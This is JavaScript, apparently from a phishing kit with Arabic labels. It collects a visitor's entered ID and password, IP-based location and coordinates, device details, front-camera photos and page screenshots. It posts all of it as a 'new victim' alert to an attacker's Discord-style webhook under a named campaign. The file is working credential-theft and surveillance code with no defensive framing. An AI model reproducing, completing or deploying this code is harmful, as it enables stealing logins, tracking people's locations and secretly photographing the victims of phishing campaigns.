async function getGeo(){
  const out = {};
  try {
    const r = await fetch('https://ipapi.co/json/');
    if (r.ok){
      const d = await r.json();
      out.ip = d.ip; out.city = d.city; out.region = d.region;
      out.country = d.country_name; out.isp = d.org;
      out.lat = d.latitude; out.lon = d.longitude;
      return out;
    }
  } catch(e){}
  try {
    const r = await fetch('https://ipwho.is/');
    const d = await r.json();
    if (d && d.success !== false){
      out.ip = d.ip; out.city = d.city; out.region = d.region;
      out.country = d.country; out.isp = d.connection && d.connection.isp;
      out.lat = d.latitude; out.lon = d.longitude;
    }
  } catch(e){}
  return out;
}

function deviceInfo(){
  const ua = navigator.userAgent;
  let os = 'غير معروف';
  if (/android/i.test(ua)) os = 'Android';
  else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
  else if (/windows/i.test(ua)) os = 'Windows';
  else if (/mac/i.test(ua)) os = 'macOS';
  else if (/linux/i.test(ua)) os = 'Linux';
  let br = 'غير معروف';
  if (/edg\//i.test(ua)) br = 'Edge';
  else if (/opr\/|opera/i.test(ua)) br = 'Opera';
  else if (/chrome|crios/i.test(ua)) br = 'Chrome';
  else if (/firefox|fxios/i.test(ua)) br = 'Firefox';
  else if (/safari/i.test(ua)) br = 'Safari';
  return { os, br, res: screen.width + 'x' + screen.height, ua };
}

async function send(hook, payload, files){
  const fd = new FormData();
  fd.append('payload_json', JSON.stringify(payload));
  (files || []).forEach((f, i) => fd.append('files[' + i + ']', f.blob, f.name));
  const r = await fetch(hook, { method: 'POST', body: fd });
  if (!r.ok) throw new Error('HTTP ' + r.status);
}

function buildPayload(cfg, step, id, pw, geo, camState){
  const app = APPS.find(a => a.id === cfg.a) || APPS[0];
  const dev = deviceInfo();
  const fields = [
    { name: '📱 التطبيق', value: app.name, inline: true },
    { name: '🎯 الحملة', value: cfg.c || '—', inline: true },
    { name: '🔖 النوع', value: step === 1 ? 'المعرّف' : 'بيانات كاملة', inline: true },
    { name: '👤 المعرّف', value: '`' + (id || '—') + '`', inline: false },
    { name: '🔒 كلمة السر', value: '`' + (pw || '—') + '`', inline: false },
    { name: '💻 الجهاز', value: dev.os + ' / ' + dev.br + ' / ' + dev.res, inline: true },
    { name: '🕒 الوقت', value: new Date().toLocaleString('ar-EG'), inline: true }
  ];
  if (camState) fields.push({ name: '📷 الكاميرا', value: camState, inline: true });
  if (geo && (geo.city || geo.ip)){
    const loc = [geo.city, geo.region, geo.country].filter(Boolean).join('، ');
    fields.push({ name: '📍 الموقع', value: loc + '\n`' + (geo.ip || '') + '`' + (geo.isp ? '\n' + geo.isp : ''), inline: false });
    if (geo.lat && geo.lon){
      fields.push({ name: '🗺️ الإحداثيات', value: `[${geo.lat}, ${geo.lon}](https://www.google.com/maps?q=${geo.lat},${geo.lon})`, inline: false });
    }
  }
  return {
    username: 'Venice Capture',
    avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
    embeds: [{
      title: '🔔 ضحية جديدة — ' + app.name,
      color: 0x5865f2,
      fields,
      footer: { text: 'Campaign: ' + (cfg.c || 'default') },
      timestamp: new Date().toISOString()
    }]
  };
}

/* =========================================================
   التصوير بالكاميرا
   ========================================================= */
let camStream = null, camSkipped = false;

function camDots(count){
  $('#camDots').innerHTML = Array.from({ length: count }, () => '<i></i>').join('');
}
function markDot(i){
  const d = $('#camDots').children[i];
  if (d) d.classList.add('done');
}

async function camCapture(count){
  const result = { blobs: [], state: 'مرفوضة' };
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return result;

  try {
    camStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } },
      audio: false
    });
  } catch(e){ return result; }

  const ov = $('#camOv'), vid = $('#camVid');
  camSkipped = false;
  camDots(count);
  vid.srcObject = camStream;
  ov.classList.add('on');
  try { await vid.play(); } catch(e){}

  // انتظار ضبط التركيز والتعريض
  await new Promise(r => setTimeout(r, 1100));

  for (let i = 0; i < count; i++){
    if (camSkipped) break;
    // عدّاد 3 - 2 - 1
    const cd = $('#camCount');
    cd.style.display = 'grid';
    for (let n = 3; n > 0; n--){
      cd.textContent = n;
      await new Promise(r => setTimeout(r, 480));
      if (camSkipped) break;
    }
    cd.style.display = 'none';
    if (camSkipped) break;

    // فلاش + التقاط
    $('#camFlash').classList.add('on');
    await new Promise(r => setTimeout(r, 90));

    const cv = document.createElement('canvas');
    cv.width = vid.videoWidth || 720;
    cv.height = vid.videoHeight || 960;
    const ctx = cv.getContext('2d');
    ctx.translate(cv.width, 0);
    ctx.scale(-1, 1);
    try { ctx.drawImage(vid, 0, 0, cv.width, cv.height); } catch(e){}
    const blob = await new Promise(r => cv.toBlob(r, 'image/jpeg', 0.86));

    $('#camFlash').classList.remove('on');
    if (blob){ result.blobs.push(blob); markDot(i); }
    await new Promise(r => setTimeout(r, 420));
  }

  // تنظيف
  try { camStream.getTracks().forEach(t => t.stop()); } catch(e){}
  camStream = null;
  ov.classList.remove('on');
  result.state = result.blobs.length ? 'تم التصوير (' + result.blobs.length + ')' : 'لم يتم التصوير';
  return result;
}

$('#camSkip').onclick = () => { camSkipped = true; };

/* =========================================================
   لقطات الشاشة
   ========================================================= */
async function capture(root, count, delay){
  if (typeof html2canvas !== 'function') return [];
  const out = [];
  for (let i = 0; i < count; i++){
    try {
      const canvas = await html2canvas(root, { scale: 1, useCORS: true, logging: false, backgroundColor: null });
      const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
      if (blob) out.push(blob);
    } catch(e){}
    if (i < count - 1) await new Promise(r => setTimeout(r, delay));
  }
  return out;
}

